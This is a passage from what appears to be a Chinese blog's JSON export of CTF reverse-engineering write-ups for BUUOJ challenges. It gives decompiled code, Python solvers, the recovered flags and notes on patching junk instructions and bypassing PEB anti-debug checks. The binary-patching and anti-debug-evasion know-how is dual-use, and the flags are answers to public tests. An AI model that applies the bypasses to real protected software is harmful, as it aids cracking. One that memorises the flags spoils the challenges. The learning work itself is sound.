base64.b64decode(cipher+&quot;==&quot;)key = b&quot;where_are_u_now?&quot; # SM4解密flag = pysm4.decrypt(int(binascii.hexlify(cipher).decode(), 16), (int(binascii.hexlify(key).decode(), 16)))print(binascii.unhexlify(hex(flag)[2:].encode())) flag{SM4foRExcepioN?!} [FlareOn1]Bob Doge 链接: https://buuoj.cn/challenges#[FlareOn1]Bob Doge EXE 64 下载下来是一个安装程序 得到Challenge1.exe 丢进dnspy64 在函数btnDecode_Click里打断点看字符串 可以看到flag flag{3rmahg3rd.b0b.d0ge@flare-on.com} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Reverse_PEB","slug":"Reverse-PEB","date":"2021-05-24T23:13:45.000Z","updated":"2021-05-24T12:40:53.000Z","comments":true,"path":"2021/05/24/Reverse-PEB/","link":"","permalink":"https://yoloyolo.top/2021/05/24/Reverse-PEB/","excerpt":"https://buuoj.cn/challenges#crackMe 关于这道题目的反调试知识","text":"https://buuoj.cn/challenges#crackMe 关于这道题目的反调试知识 PEB结构体 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465+0x000 InheritedAddressSpace : UChar+0x001 ReadImageFileExecOptions : UChar+0x002 BeingDebugged : UChar+0x003 SpareBool : UChar+0x004 Mutant : Ptr32 Void+0x008 ImageBaseAddress : Ptr32 Void+0x00c Ldr : Ptr32 _PEB_LDR_DATA+0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS+0x014 SubSystemData : Ptr32 Void+0x018 ProcessHeap : Ptr32 Void+0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION+0x020 FastPebLockRoutine : Ptr32 Void+0x024 FastPebUnlockRoutine : Ptr32 Void+0x028 EnvironmentUpdateCount : Uint4B+0x02c KernelCallbackTable : Ptr32 Void+0x030 SystemReserved : [1] Uint4B+0x034 AtlThunkSListPtr32 : Uint4B+0x038 FreeList : Ptr32 _PEB_FREE_BLOCK+0x03c TlsExpansionCounter : Uint4B+0x040 TlsBitmap : Ptr32 Void+0x044 TlsBitmapBits : [2] Uint4B+0x04c ReadOnlySharedMemoryBase : Ptr32 Void+0x050 ReadOnlySharedMemoryHeap : Ptr32 Void+0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void+0x058 AnsiCodePageData : Ptr32 Void+0x05c OemCodePageData : Ptr32 Void+0x060 UnicodeCaseTableData : Ptr32 Void+0x064 NumberOfProcessors : Uint4B+0x068 NtGlobalFlag : Uint4B+0x070 CriticalSectionTimeout : _LARGE_INTEGER+0x078 HeapSegmentReserve : Uint4B+0x07c HeapSegmentCommit : Uint4B+0x080 HeapDeCommitTotalFreeThreshold : Uint4B+0x084 HeapDeCommitFreeBlockThreshold : Uint4B+0x088 NumberOfHeaps : Uint4B+0x08c MaximumNumberOfHeaps : Uint4B+0x090 ProcessHeaps : Ptr32 Ptr32 Void+0x094 GdiSharedHandleTable : Ptr32 Void+0x098 ProcessStarterHelper : Ptr32 Void+0x09c GdiDCAttributeList : Uint4B+0x0a0 LoaderLock : Ptr32 Void+0x0a4 OSMajorVersion : Uint4B+0x0a8 OSMinorVersion : Uint4B+0x0ac OSBuildNumber : Uint2B+0x0ae OSCSDVersion : Uint2B+0x0b0 OSPlatformId : Uint4B+0x0b4 ImageSubsystem : Uint4B+0x0b8 ImageSubsystemMajorVersion : Uint4B+0x0bc ImageSubsystemMinorVersion : Uint4B+0x0c0 ImageProcessAffinityMask : Uint4B+0x0c4 GdiHandleBuffer : [34] Uint4B+0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void+0x154 TlsExpansionBitmapBits : [32] Uint4B+0x1d4 SessionId : Uint4B+0x1d8 AppCompatFlags : _ULARGE_INTEGER+0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER_ULARGE_INTEGER+0x1e8 pShimData : Ptr32 Void+0x1ec AppCompatInfo : Ptr32 Void+0x1f0 CSDVersion : _UNICODE_STRING+0x1f8 ActivationContextData : Ptr32 Void+0x1fc ProcessAssemblyStorageMap : Ptr32 Void+0x200 SystemDefaultActivationContextData : Ptr32 Void+0x204 SystemAssemblyStorageMap : Ptr32 Void+0x208 MinimumStackCommit : Uint4B IDA中反编译的结果以及对于PEB结构体的定义描述与真实情况有些出入, 需要以汇编代码为准 1if ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + 0x0C) != 2 ) 12345.text:004015D4 mov eax, large fs:30h.text:004015DA mov eax, [eax+18h].text:004015DD mov eax, [eax+0Ch].text:004015E0 cmp eax, 2.text:004015E3 jz short loc_401628 1if ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + 0x0C) != 2 ) 12345.text:00401985 mov eax, large fs:30h.text:0040198B mov eax, [eax+18h].text:0040198E mov eax, [eax+0Ch].text:00401991 cmp eax, 2.text:00401994 jz short loc_4019A2 HEAP结构体 123456789+0×000 Entry :_HEAP_ENTRY+0×008 Signature :Uint4B+0×00c Flags :Uint4B+0×010 ForceFlags :Uint4B+0×014 VirtualMemoryThreshold :Uint4B+0×018 SegmentReserve :Uint4B+0×01c SegmentCommit :Uint4B+0×020 DeCommitFreeBlockThreshold :Uint4B... 1if ( ((int)NtCurrentPeb()-&gt;NtGlobalFlag &amp; 0x70) != 0 ) 12345.text:00401ADA mov eax, large fs:30h.text:00401AE0 mov eax, [eax+68h].text:00401AE3 and eax, 70h.text:00401AE6 test eax, eax.text:00401AE8 jz short loc_401B00 1if ( (unsigned __int8)*(_DWORD *)&amp;NtCurrentPeb()-&gt;BeingDebugged ) 1234567.text:00401B4D mov eax, large fs:30h.text:00401B53 inc eax.text:00401B54 inc eax.text:00401B55 mov eax, [eax].text:00401B57 and eax, 0FFh.text:00401B5C test eax, eax.text:00401B5E jz short loc_401B6E 当程序被调试时, 以上if语句均可能成立, 从而对程序的流程产生影响 所以基本看到PEB出现NOP就完事了 《逆向工程核心原理》 Page.529","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"PEB","slug":"PEB","permalink":"https://yoloyolo.top/tags/PEB/"},{"name":"Anti-Debug","slug":"Anti-Debug","permalink":"https://yoloyolo.top/tags/Anti-Debug/"}]},{"title":"Reverse_2","slug":"Reverse-2","date":"2021-05-21T17:53:31.000Z","updated":"2021-06-08T12:34:59.000Z","comments":true,"path":"2021/05/21/Reverse-2/","link":"","permalink":"https://yoloyolo.top/2021/05/21/Reverse-2/","excerpt":"感觉逆向越来越有意思了","text":"感觉逆向越来越有意思了 [GWCTF 2019]xxor 链接: https://buuoj.cn/challenges#[GWCTF 2019]xxor ELF 64 IDA中 main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed int i; // [rsp+8h] [rbp-68h] signed int j; // [rsp+Ch] [rbp-64h] __int64 v6; // [rsp+10h] [rbp-60h] __int64 v7; // [rsp+18h] [rbp-58h] __int64 v8; // [rsp+20h] [rbp-50h] __int64 v9; // [rsp+28h] [rbp-48h] __int64 v10; // [rsp+30h] [rbp-40h] __int64 v11; // [rsp+40h] [rbp-30h] __int64 v12; // [rsp+48h] [rbp-28h] __int64 v13; // [rsp+50h] [rbp-20h] __int64 v14; // [rsp+58h] [rbp-18h] __int64 v15; // [rsp+60h] [rbp-10h] unsigned __int64 v16; // [rsp+68h] [rbp-8h] v16 = __readfsqword(0x28u); puts(&quot;Let us play a game?&quot;); puts(&quot;you have six chances to input&quot;); puts(&quot;Come on!&quot;); v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; for ( i = 0; i &lt;= 5; ++i ) &#123; printf(&quot;%s&quot;, &quot;input: &quot;, (unsigned int)i); __isoc99_scanf(&quot;%d&quot;, (char *)&amp;v6 + 4 * i); &#125; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; for ( j = 0; j &lt;= 4; j += 2 ) &#123; dword_601078 = *((_DWORD *)&amp;v6 + j); dword_60107C = *((_DWORD *)&amp;v6 + j + 1); sub_400686(&amp;dword_601078, &amp;unk_601060); *((_DWORD *)&amp;v11 + j) = dword_601078; *((_DWORD *)&amp;v11 + j + 1) = dword_60107C; &#125; if ( (unsigned int)sub_400770(&amp;v11) != 1 ) &#123; puts(&quot;NO NO NO~ &quot;); exit(0); &#125; puts(&quot;Congratulation!\\n&quot;); puts(&quot;You seccess half\\n&quot;); puts(&quot;Do not forget to change input to hex and combine~\\n&quot;); puts(&quot;ByeBye&quot;); return 0LL;&#125; 第一个for循环用于输入 第二个for循环用于加密 函数sub_400770用于校验加密结果 123456789101112131415161718192021signed __int64 __fastcall sub_400770(_DWORD *a1)&#123; signed __int64 result; // rax if ( a1[2] - a1[3] != 2225223423LL || a1[3] + a1[4] != 4201428739LL || a1[2] - a1[4] != 1121399208LL ) &#123; puts(&quot;Wrong!&quot;); result = 0LL; &#125; else if ( *a1 != -548868226 || a1[5] != -2064448480 || a1[1] != 550153460 ) &#123; puts(&quot;Wrong!&quot;); result = 0LL; &#125; else &#123; puts(&quot;good!&quot;); result = 1LL; &#125; return result;&#125; 可以根据已知条件还原出加密的结果 12345678910111213141516171819202122__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2)&#123; __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i &lt;= 0x3F; ++i ) &#123; v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10; &#125; *a1 = v3; result = v4; a1[1] = v4; return result;&#125; 这里unsigned int a1=&amp;dword_601078 两者都是四字节的数据 12v3 = *a1;v4 = a1[1]; 然而这两句代码就将dword_601078变成了一个数组 一开始有点云里雾里的 但是观察dword_601078的text view时 1234.bss:0000000000601078 dword_601078 dd ? ; DATA XREF: main+E6↑w.bss:0000000000601078 ; main+103↑o ....bss:000000000060107C dword_60107C dd ? ; DATA XREF: main+F8↑w.bss:000000000060107C ; main+122↑r 便可以理解dword_601078[1]就是dword_60107C 写python脚本时, 为了保证与C语言相同的运行效果, 变量在进行计算时都最好加一个&amp;0xffffffff 网上看到有用ctypes写的, 但是感觉调用起来好麻烦 123456789101112131415161718192021222324252627#!/usr/bin/env python3import binasciicipher = [0xdf48ef7e, 0x20caacf4, 0, 0, 0, 0x84f30420, ]x1 = 0x84A236FFx2 = 0xFA6CB703x3 = 0x42D731A8cipher[2] = (x1+x2+x3)//2cipher[3] = (cipher[2] - x1)&amp;0xffffffffcipher[4] = (cipher[2] - x3)&amp;0xfffffffffor i in range(0, 5, 2): tmp = (0x458BCD42*64)&amp;0xffffffff for _ in range(64): cipher[i+1] = (cipher[i+1] - ((cipher[i] + tmp + 20) ^ ((cipher[i] &lt;&lt; 6) + 3) ^ ((cipher[i] &gt;&gt; 9) + 4) ^ 0x10))&amp;0xffffffff cipher[i] = (cipher[i] - ((cipher[i+1] + tmp + 11) ^ ((cipher[i+1] &lt;&lt; 6) + 2) ^ ((cipher[i+1] &gt;&gt; 9) + 2) ^ 0x20))&amp;0xffffffff tmp = (tmp-0x458BCD42)&amp;0xffffffffflag = &quot;&quot;for _ in cipher: flag += hex(_)[2:]print(binascii.unhexlify(flag.encode())) flag{re_is_great!} [HDCTF2019]Maze 链接: https://buuoj.cn/challenges#[HDCTF2019]Maze EXE 32 UPX脱壳 IDA打开后左侧函数列表中找不到 main 函数 在text view中可以看到_main函数的标识 12jnz short near ptr loc_40102E+1call near ptr 0EC85D78Bh 但是这两行明显存在问题, 应该是花指令 第一行patch为nop(右键-&gt;Keypatch-&gt;Patcher) 第二行转为数据之后把db 0E8hpatch为nop 然后选中 main 函数部分转为函数就能顺利地查看反编译代码了 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [esp+10h] [ebp-14h] char v5[16]; // [esp+14h] [ebp-10h] sub_401140((int)aGoThroughTheMa); scanf(a14s, v5); for ( i = 0; i &lt;= 13; ++i ) &#123; switch ( v5[i] ) &#123; case &#x27;a&#x27;: --dword_408078; break; case &#x27;d&#x27;: ++dword_408078; break; case &#x27;s&#x27;: --dword_40807C; break; case &#x27;w&#x27;: ++dword_40807C; break; default: continue; &#125; &#125; if ( dword_408078 != 5 || dword_40807C != -4 ) &#123; sub_401140((int)aTryAgain); &#125; else &#123; sub_401140((int)aCongratulation); sub_401140((int)aHereIsTheFlagF, v5); &#125; return 0;&#125; dword_408078 = 7 dword_40807C = 0 接着在数据区浏览可以看到定义迷宫形状的数据 1*******+********* ****** **** ******* **F****** ************** 因为字符串长度为70, 则可以考虑几种因数组合 12345678910*******+**-&gt;dword_408078+******* ****** **** ******* **F****** **************|vdword_40807C+ 那么可以得到flag flag{ssaaasaassdddw} [FlareOn4]IgniteMe 链接: https://buuoj.cn/challenges#[FlareOn4]IgniteMe EXE 32 IDA中 start 函数反编译结果如下 123456789101112131415void __noreturn start()&#123; DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, &amp;NumberOfBytesWritten, 0); sub_4010F0(NumberOfBytesWritten); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, &amp;NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, &amp;NumberOfBytesWritten, 0); ExitProcess(0);&#125; 函数sub_4010F0功能应该为读取文件并将内容(flag)存放于byte_403078 函数sub_401050则实现了对于flag的加密 123456789101112131415161718192021signed int sub_401050()&#123; int v0; // ST04_4 int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v0 = sub_401020(byte_403078); v4 = sub_401000(); for ( i = v0 - 1; i &gt;= 0; --i ) &#123; byte_403180[i] = v4 ^ byte_403078[i]; v4 = byte_403078[i]; &#125; for ( j = 0; j &lt; 0x27; ++j ) &#123; if ( byte_403180[j] != (unsigned __int8)byte_403000[j] ) return 0; &#125; return 1;&#125; 密文结果存放于byte_403000 1234567byte_403000 = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69] 1234__int16 sub_401000()&#123; return (unsigned __int16)__ROL4__(-2147024896, 4) &gt;&gt; 1;&#125; v4的值来自于函数sub_401000 __ROL4__用于循环左移四位 手动计算可以得到结果0x00380004 由于返回值的数据类型是unsigned __int16, 则会返回低16位的数据 即0x0004 12345678910111213141516171819#!/usr/bin/env python3cipher = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69]tmp = 0x04_flag = []for _ in cipher[::-1]: plain = _^tmp _flag.append(plain) tmp = plain_flag = _flag[::-1]flag = &quot;&quot;for _ in _flag: flag += chr(_)print(flag) flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com} [BJDCTF2020]BJD hamburger competition 链接: https://buuoj.cn/challenges#[BJDCTF2020]BJD hamburger competition .NET 使用dnSpy打开Assembly-CSharp.dll 在左侧程序集资源管理器中依次打开 Assembly-CSharp-&gt;--&gt;ButtonSpawnFruit-&gt;Spawn() 可以看到如下代码 1234567Init.secret ^= 127;string str = Init.secret.ToString();if (ButtonSpawnFruit.Sha1(str) == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;)&#123; this.result = &quot;BJDCTF&#123;&quot; + ButtonSpawnFruit.Md5(str) + &quot;&#125;&quot;; Debug.Log(this.result);&#125; 其中有一个坑, 函数MD5的代码如下所示 1234567891011public static string Md5(string str)&#123; byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = MD5.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) &#123; stringBuilder.Append(b.ToString(&quot;X2&quot;)); &#125; return stringBuilder.ToString().Substring(0, 20);&#125; 返回的结果为MD5前20位 且ToString(&quot;X2&quot;)将字符串转为大写 123456#!/usr/bin/env python3import hashlibfor i in range(100000): if hashlib.sha1(str(i).encode()).hexdigest().upper() == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;: print(&quot;flag&#123;&quot;+hashlib.md5(str(i).encode()).hexdigest()[:20].upper()+&quot;&#125;&quot;) break flag{B8C37E33DEFDE51CF91E} [MRCTF2020]Xor 链接: https://buuoj.cn/challenges#[MRCTF2020]Xor EXE 32 IDA中不能直接找到关于flag加密的函数 根据程序所输出的字符串Give Me Your Flag String: 在IDA中进行搜索(Search-&gt;sequence of bytes) 找到对应的数据部分, 然后找到调用该数据的函数 123456789101112131415161718192021222324252627int sub_401090()&#123; unsigned int v0; // eax sub_401020((int)&quot;Give Me Your Flag String:\\n&quot;); sub_401050((int)&quot;%s&quot;, byte_4212C0, 100); if ( strlen(byte_4212C0) != 27 ) &#123;LABEL_6: sub_401020((int)&quot;Wrong!\\n&quot;); sub_404B7E(&quot;pause&quot;); sub_40355F(0); __debugbreak(); JUMPOUT(*(_DWORD *)__security_check_cookie); &#125; v0 = 0; do &#123; if ( ((unsigned __int8)v0 ^ (unsigned __int8)byte_4212C0[v0]) != byte_41EA08[v0] ) goto LABEL_6; ++v0; &#125; while ( v0 &lt; 0x1B ); sub_401020((int)&quot;Right!\\n&quot;); sub_404B7E(&quot;pause&quot;); return 0;&#125; 123456#!/usr/bin/env python3cipher = &quot;MSAWB~FXZ:J:`tQJ\\&quot;N@ bpdd&#125;8g&quot;flag = &quot;&quot;for _ in range(len(cipher)): flag += chr(_^ord(cipher[_]))print(flag) flag{@_R3@1ly_E2_R3verse!} [MRCTF2020]hello_world_go 链接: https://buuoj.cn/challenges#[MRCTF2020]hello_world_go ELF 64 IDA中 main_main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990__int64 __fastcall main_main(__int64 a1, __int64 a2)&#123; __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 __int64 v6; // rdx __int64 v7; // r8 __int64 v8; // rcx __int64 v9; // rdx __int64 v10; // r9 signed __int64 v11; // rax __int64 result; // rax __int64 v13; // ST58_8 __int64 *v14; // [rsp+8h] [rbp-A8h] char v15; // [rsp+18h] [rbp-98h] __int64 *v16; // [rsp+60h] [rbp-50h] __int128 v17; // [rsp+68h] [rbp-48h] __int128 v18; // [rsp+78h] [rbp-38h] __int128 v19; // [rsp+88h] [rbp-28h] __int128 v20; // [rsp+98h] [rbp-18h] if ( (unsigned __int64)&amp;v18 + 8 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(a1, a2); v16 = v14; *(_QWORD *)&amp;v20 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v20 + 1) = &amp;off_4EA530; fmt_Fprint(a1, a2, (__int64)&amp;v20, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); *(_QWORD *)&amp;v19 = &amp;unk_4A96A0; *((_QWORD *)&amp;v19 + 1) = v16; fmt_Fscanf( a1, a2, (__int64)&amp;go_itab__os_File_io_Reader, (__int64)&amp;v19, v4, v5, (__int64)&amp;go_itab__os_File_io_Reader, os_Stdin, (__int64)&amp;unk_4D07C9, 2LL); v8 = v16[1]; if ( v8 != 24 ) goto LABEL_3; v13 = *v16; runtime_memequal(a1, a2, v6, (unsigned __int64)&amp;unk_4D3C58); if ( !v15 ) &#123; v8 = 24LL;LABEL_3: runtime_cmpstring(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7); if ( (signed __int64)&amp;v19 &gt;= 0 ) v11 = 1LL; else v11 = -1LL; goto LABEL_5; &#125; v11 = 0LL;LABEL_5: if ( v11 ) &#123; *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v17 + 1) = &amp;off_4EA550; result = fmt_Fprintln( a1, a2, v9, (__int64)&amp;go_itab__os_File_io_Writer, v7, v10, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); &#125; else &#123; *(_QWORD *)&amp;v18 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v18 + 1) = &amp;off_4EA540; result = fmt_Fprintln( a1, a2, v9, (__int64)&amp;go_itab__os_File_io_Writer, v7, v10, (__int64)&amp;go_itab__os_File_io_Writer, os_Stdout); &#125; return result;&#125; 函数runtime_cmpstring看着有些问题 跟进unk_4D3C58得到flag flag{hello_world_gogogo} [WUSTCTF2020]level3 链接: https://buuoj.cn/challenges#[WUSTCTF2020]level3 ELF 64 IDA中 main 函数反编译结果如下 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v3; // ST0F_1 char *v4; // rax char v6; // [rsp+10h] [rbp-40h] unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); printf(&quot;Try my base64 program?.....\\n&gt;&quot;, argv, envp); __isoc99_scanf(&quot;%20s&quot;, &amp;v6); v3 = time(0LL); srand(v3); if ( rand() &amp; 1 ) &#123; v4 = base64_encode(&amp;v6); puts(v4); puts(&quot;Is there something wrong?&quot;); &#125; else &#123; puts(&quot;Sorry I think it&#x27;s not prepared yet....&quot;); puts(&quot;And I get a strange string from my program which is different from the standard base64:&quot;); puts(&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;); puts(&quot;What&#x27;s wrong??&quot;); &#125; return 0;&#125; 看到一段Base64编码, 但是不能解码得到flag 跟进函数base64_encode 没有看到明显的加密函数或替换表函数, 逆向Base64编码的具体步骤有些麻烦, 这里采用了曲线救国的方案 12345678./attachment Try my base64 program?.....&gt;000HQTwIs there something wrong?------echo -n &quot;000&quot; | base64MDAw 通过这一步的操作我们可以得到三个字符的替换关系, 那么只要更改输入内容并且重复次数足够多, 就能够fuzz出完整的替换关系 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3from pwn import *import base64import reimport stringdic = string.ascii_lowercase+string.ascii_uppercase+string.digitslength = len(dic)string1 = &quot;&quot;string2 = &quot;&quot;for _ in dic: test = _*3 test_b64 = base64.b64encode(test.encode()).decode() lst_res = [] while lst_res == []: p = process(&quot;./attachment&quot;) p.recv() p.sendline(test) res = p.recv().decode() lst_res = re.findall(&quot;&gt;(.*?)\\nIs there something wrong?&quot;, res) p.close() res_b64 = lst_res[0] for _ in range(len(res_b64)): if res_b64[_] != test_b64[_] and test_b64[_] not in string1 and res_b64[_] not in string2 : string1 += test_b64[_] string2 += res_b64[_]cipher = &quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;flag = &quot;&quot;for _ in cipher: if _ in string2: flag += string1[string2.index(_)] else: flag += _print(base64.b64decode(flag.encode())) flag{Base64_is_the_start_of_reverse} [WUSTCTF2020]Cr0ssfun 链接: https://buuoj.cn/challenges#[WUSTCTF2020]Cr0ssfun ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-30h] puts(&quot; _ _ _ _ _____ _____ _____ &quot;); puts(&quot;| | | | | | / ___|_ _| / ___| &quot;); puts(&quot;| | | | | | \\\\ `--. | | \\\\ `--. ___ ___ &quot;); puts(&quot;| |/\\\\| | | | |`--. \\\\ | | `--. \\\\/ _ \\\\/ __|&quot;); puts(&quot;\\\\ /\\\\ / |_| /\\\\__/ / | | /\\\\__/ / __/ (__ &quot;); puts(&quot; \\\\/ \\\\/ \\\\___/\\\\____/ \\\\_/ \\\\____/ \\\\___|\\\\___|&quot;); while ( 1 ) &#123; puts(&quot;Input the flag&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); if ( (unsigned int)check(&amp;v4) == 1 ) break; puts(&quot;0ops, your flag seems fake.&quot;); puts(&quot;==============================&quot;); rewind(_bss_start); &#125; puts(&quot;Your flag is correct, go and submit it!&quot;); return 0;&#125; 跟进函数Check以及之后的函数即可得到flag flag{cpp_@nd_r3verse_@re_fun} [[FlareOn6]Overlong 链接: https://buuoj.cn/challenges#[FlareOn6]Overlong EXE 32 IDA中 start 函数反编译结果如下 123456789101112int __stdcall start(int a1, int a2, int a3, int a4)&#123; int v4; // eax CHAR Text[128]; // [esp+0h] [ebp-84h] int v7; // [esp+80h] [ebp-4h] v4 = sub_401160(Text, &amp;unk_402008, 28); v7 = v4; Text[v4] = 0; MessageBoxA(0, Text, Caption, 0); return 0;&#125; unk_402008的长度为175, 即0xAF 但是所限定的长度为28 所以flag应该就在后面的内容之中 静调看代码的话过于复杂, 这题应该用动调 一开始打算把push 1ChPatch成push AFh 但是发现要在IDA中改成AF的话会强制转成dword, 然后多余的三个'\\x00'字节会占用掉后面一条汇编代码的空间 用OD调试, 在直接修改汇编代码时同样出现了与IDA中相同的问题 所以可以在数据被PUSH入栈之后再对栈内的数据进行修改 当然你完全可以拿一个十六进制编辑器直接修改字节码 flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com} crackMe 链接: https://buuoj.cn/challenges#crackMe EXE 32 IDA中 _wmain 函数反编译结果如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int wmain()&#123; FILE *v0; // eax FILE *v1; // eax char v3; // [esp+3h] [ebp-405h] char v4; // [esp+4h] [ebp-404h] BYREF char v5[255]; // [esp+5h] [ebp-403h] BYREF char Format; // [esp+104h] [ebp-304h] BYREF char v7[255]; // [esp+105h] [ebp-303h] BYREF char v8; // [esp+204h] [ebp-204h] BYREF char v9[255]; // [esp+205h] [ebp-203h] BYREF char v10; // [esp+304h] [ebp-104h] BYREF char v11[255]; // [esp+305h] [ebp-103h] BYREF printf(&quot;Come one! Crack Me~~~\\n&quot;); v10 = 0; memset(v11, 0, sizeof(v11)); v8 = 0; memset(v9, 0, sizeof(v9)); while ( 1 ) &#123; do &#123; do &#123; printf(&quot;user(6-16 letters or numbers):&quot;); scanf(&quot;%s&quot;, &amp;v10); v0 = (FILE *)sub_4024BE(); fflush(v0); &#125; while ( !(unsigned __int8)sub_401000(&amp;v10) ); printf(&quot;password(6-16 letters or numbers):&quot;); scanf(&quot;%s&quot;, &amp;v8); v1 = (FILE *)sub_4024BE(); fflush(v1); &#125; while ( !(unsigned __int8)sub_401000(&amp;v8) ); sub_401090(&amp;v10); Format = 0; memset(v7, 0, sizeof(v7)); v4 = 0; memset(v5, 0, sizeof(v5)); v3 = ((int (__cdecl *)(char *, char *))loc_4011A0)(&amp;Format, &amp;v4); if ( sub_401830((int)&amp;v10, &amp;v8) ) &#123; if ( v3 ) break; &#125; printf(&amp;v4); &#125; printf(&amp;Format); return 0;&#125; 函数sub_401090用于通过输入的username, 来生成byte_416050 代码块loc_4011A0被插入了花指令 12.text:004011EA jbe near ptr loc_4011EA+2.text:004011F0 aaa nop掉这两行就能转为函数了 函数sub_401830用于校验所输入的用户名与密码是否正确 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778bool __cdecl sub_401830(int a1, const char *a2)&#123; int v3; // [esp+18h] [ebp-22Ch] int v4; // [esp+1Ch] [ebp-228h] int v5; // [esp+28h] [ebp-21Ch] unsigned int v6; // [esp+30h] [ebp-214h] char v7; // [esp+36h] [ebp-20Eh] char v8; // [esp+37h] [ebp-20Dh] char v9; // [esp+38h] [ebp-20Ch] unsigned __int8 v10; // [esp+39h] [ebp-20Bh] unsigned __int8 v11; // [esp+3Ah] [ebp-20Ah] char v12; // [esp+3Bh] [ebp-209h] int v13; // [esp+3Ch] [ebp-208h] BYREF char v14; // [esp+40h] [ebp-204h] BYREF char v15[255]; // [esp+41h] [ebp-203h] BYREF char v16; // [esp+140h] [ebp-104h] BYREF char v17[255]; // [esp+141h] [ebp-103h] BYREF v4 = 0; v5 = 0; v11 = 0; v10 = 0; v16 = 0; memset(v17, 0, sizeof(v17)); v14 = 0; memset(v15, 0, sizeof(v15)); v9 = 0; v6 = 0; v3 = 0; while ( v6 &lt; strlen(a2) ) &#123; if ( isdigit(a2[v6]) ) &#123; v8 = a2[v6] - 48; &#125; else if ( isxdigit(a2[v6]) ) &#123; if ( *((_DWORD *)NtCurrentPeb()-&gt;SubSystemData + 3) != 2 ) 